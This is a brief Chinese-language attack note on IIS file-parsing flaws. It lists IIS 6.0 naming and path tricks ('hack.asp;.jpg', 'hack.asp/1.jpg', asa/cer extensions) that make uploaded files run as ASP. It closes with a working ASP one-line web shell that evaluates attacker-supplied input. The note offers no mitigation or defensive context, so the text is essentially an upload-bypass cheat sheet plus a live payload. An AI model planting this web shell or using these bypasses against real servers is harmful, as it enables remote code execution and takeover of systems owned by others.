# IIS文件解析漏洞



IIS使用最多的版本：

- winServer2003内置的`IIS6.0`
- winServer2008内置的 `IIS7.0`
- `IIS7.5` 
- winServer2016内置的`IIS10`

IIS6.0 默认配置： 

- `asa` `cdx` `cer` 都能当作asp解析

- 文件名`hack.asp;.jpg`会被当作asp解析
- 路径`hack.asp/1.jpg`会被当作asp解析

- `asmx`能当作aspx

asp一句话

```asp
<%eval request('a')%>
```



